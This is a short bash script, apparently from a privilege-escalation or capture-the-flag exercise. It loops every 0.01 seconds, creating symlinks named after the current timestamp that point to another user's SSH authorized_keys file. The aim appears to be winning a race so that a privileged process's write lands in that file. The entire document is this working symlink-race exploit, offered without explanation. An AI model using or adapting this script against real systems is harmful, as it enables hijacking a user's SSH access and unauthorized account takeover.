#!/bin/bash

watch -n0.01 'timestamp=`php -r "print(date(\"Y-m-d_H:i:s\"));"`; echo $timestamp;ln -s /home/srvadm/.ssh/authorized_keys ./$timestamp;'
